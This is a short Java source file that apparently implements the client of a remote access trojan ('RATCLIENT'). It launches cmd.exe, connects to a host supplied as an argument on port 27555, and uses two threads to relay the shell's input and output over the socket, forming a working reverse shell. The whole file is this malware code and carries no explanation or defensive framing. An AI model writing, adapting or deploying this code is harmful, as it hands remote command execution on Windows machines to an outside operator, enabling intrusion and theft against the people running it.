import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.Socket;

import java.io.BufferedReader;
import java.io.IOException;


public class RATCLIENT {
	BufferedReader brIn;
	BufferedReader brErr;
	BufferedReader brSocket;
	PrintWriter pwProcess;
	PrintWriter pwSocket;
	Process p;
	Socket socket;
  public RATCLIENT(String _host) throws Exception {
    String host=_host;
    int port=27555;
    String cmd="cmd.exe";
    
    p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
    brIn= new BufferedReader(new InputStreamReader(p.getInputStream()));
    pwProcess = new PrintWriter(p.getOutputStream(),true);
    InetAddress inetaddr = InetAddress.getByName(host);
    socket = new Socket(inetaddr,port);
    
    brSocket = new BufferedReader(new InputStreamReader(socket.getInputStream()));
    pwSocket = new PrintWriter(socket.getOutputStream(),true);
    
    brIN thr_brIn = new brIN();
    brSOCKET thr_brSOCKET = new brSOCKET();

    
    Thread[] theads = new Thread[2];
    theads[0] = new Thread(thr_brIn);
    theads[1] = new Thread(thr_brSOCKET);

    for (Thread t:theads) {
    	t.start();
    }
  }
  
  private class brIN implements Runnable{

	@Override
	public void run() {
		while (p.isAlive()) {
			try {
				String s = brIn.readLine();
				pwSocket.println(s);
				pwSocket.flush();					 
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
	}
  }
  
  private class brSOCKET implements Runnable{

	@Override
	public void run() {
		while (p.isAlive()) {
			try {
				String s = brSocket.readLine();
				pwProcess.println(s);
				pwProcess.flush();
				
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
	}
	  
  }
  
  public static void main(String[] args) throws Exception {
	  new RATCLIENT(args[0]);
  }
  
  
}